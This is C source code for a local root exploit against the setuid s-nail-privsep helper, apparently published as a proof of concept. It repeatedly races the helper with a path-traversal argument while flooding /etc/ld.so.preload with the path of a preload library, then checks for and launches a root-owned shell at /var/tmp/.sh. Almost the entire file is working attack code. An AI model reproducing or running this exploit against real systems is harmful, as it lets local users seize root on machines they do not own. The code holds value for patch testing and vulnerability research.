#define _GNU_SOURCE
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/wait.h>
#define DEBUG
#ifdef DEBUG
#  define dprintf printf
#else
#  define dprintf
#endif
#define ROOTSHELL "/var/tmp/.sh"
#define ITERATIONS 1000
/*
** Attempts to copy data to target quickly...
*/
static pid_t flood(char const *target, char const *data, size_t len) {
  pid_t child;
  if ((child = fork()) != 0)
    return child;
  if (nice(-20) < 0) {
    dprintf("[!] Failed to set niceness");
  }
  while (1) {
    int fd;
    if ((fd = open(target, O_WRONLY)) < 0) {
      continue;
    }
    write(fd, data, len);
    close(fd);
    usleep(10);
  }
  return child;
}
/*
** This triggers the vulnerability. (a lot.)
*/
static pid_t race(char const *path, char const *target) {
  pid_t child;
  if ((child = fork()) != 0)
    return child;
  char *argv[] = {
    NULL, "rdotlock",
    "mailbox",	NULL, // \$TMPDIR/foo
    "name",	NULL, // \$TMPDIR/foo.lock
    "hostname",	"spam",
    "randstr",	NULL, // eggs/../../../../../../..\$TARGET
    "pollmsecs","0",
    NULL
  };
  char tmpdir[] = "/tmp/tmpdir.XXXXXX";
  char *loldir;
  int fd, pid, inpipe[2], outpipe[2];
  if (!mkdtemp(tmpdir)) {
    dprintf("[-] mkdtemp(%s)", tmpdir);
    exit(EXIT_FAILURE);
  }
  if (!(argv[0] = strrchr(path, '/'))) {
    dprintf("[-] %s is not full path to privsep.", path);
    exit(EXIT_FAILURE);
  }
  argv[0] += 1; // skip '/'.
  // (nope I'm not going to free those later.)
  if (asprintf(&loldir, "%s/foo.lock.spam.eggs", tmpdir) < 0 ||
      asprintf(&argv[3], "%s/foo", tmpdir) < 0 ||
      asprintf(&argv[5], "%s/foo.lock", tmpdir) < 0 ||
      asprintf(&argv[9], "eggs/../../../../../../..%s", target) < 0) {
    dprintf("[-] asprintf() failed\n");
    exit(EXIT_FAILURE);
  }
  // touch \$tmpdir/foo
  if ((fd = open(argv[3], O_WRONLY | O_CREAT, 0640)) < 0) {
    dprintf("[-] open(%s) failed\n", argv[3]);
    exit(EXIT_FAILURE);
  }
  close(fd);
  // mkdir \$tmpdir/foo.lock.spam.eggs
  if (mkdir(loldir, 0755) < 0) {
    dprintf("[-] mkdir(%s) failed\n", loldir);
    exit(EXIT_FAILURE);
  }
  // OK, done setting up the environment & args.
  // Setup some pipes and let's get going.
  if (pipe(inpipe) < 0 || pipe(outpipe) < 0) {
    dprintf("[-] pipe() failed\n");
    exit(EXIT_FAILURE);
  }
  close(inpipe[1]);
  close(outpipe[0]);
  while (1) {
    if ((pid = fork()) < 0) {
      dprintf("[!] fork failed\n");
      continue;
    } else if (pid) {
      waitpid(pid, NULL, 0);
      continue;
    }
    // This is the child, give it the pipes it wants. (-_-')
    if (dup2(inpipe[0], 0) < 0 || dup2(outpipe[1], 1) < 0) {
      dprintf("[-] dup2() failed\n");
      exit(EXIT_FAILURE);
    }
    if (nice(20) < 0) {
      dprintf("[!] Failed to set niceness");
    }
    execv(path, argv);
    dprintf("[-] execve(%s) failed\n", path);
    exit(EXIT_FAILURE);
  }
  return child;
}
int main(int argc, char **argv, char **envv) {
  char payload[] = "/var/tmp/.snail.so";
  char const *target = "/etc/ld.so.preload";
  char const *privsep_path = argv[1];
  pid_t flood_pid, race_pid;
  struct stat st;
  if (argc != 2) {
    dprintf("usage: %s /full/path/to/privsep\n", argv[0]);
    exit(EXIT_FAILURE);
  }
  lstat(privsep_path, &st);
  if ((long)st.st_uid != 0) {
    dprintf("[-] privsep path is not valid: %s\n", privsep_path);
    exit(EXIT_FAILURE);
  }
  dprintf("[=] s-nail-privsep local root by @wapiflapi\n");
  if ((flood_pid = flood(target, payload, sizeof payload)) == -1) {
    dprintf("[-] flood() failed\n");
    exit(EXIT_FAILURE);
  }
  dprintf("[.] Started flood in %s\n", target);
  if ((race_pid = race(privsep_path, target)) == -1) {
    dprintf("[-] race() failed\n");
    exit(EXIT_FAILURE);
  }
  dprintf("[.] Started race with %s\n", privsep_path);
  dprintf("[.] This could take a while...\n");
  for (int i = 1; i <= ITERATIONS; i++) {
    dprintf("[.] Race #%d of %d ...\n", i, ITERATIONS);
    system(privsep_path);
    lstat(ROOTSHELL, &st);
    if ((long)st.st_uid == 0)
      break;
  }
  kill(race_pid, SIGKILL);
  kill(flood_pid, SIGKILL);
  if ((long)st.st_uid != 0) {
    dprintf("[-] Failed. Not vulnerable?\n");
    exit(EXIT_FAILURE);
  }
  dprintf("[+] got root! %s (uid=%ld gid=%ld)\n", ROOTSHELL, (long)st.st_uid, (long)st.st_gid);
  return system(ROOTSHELL);
}
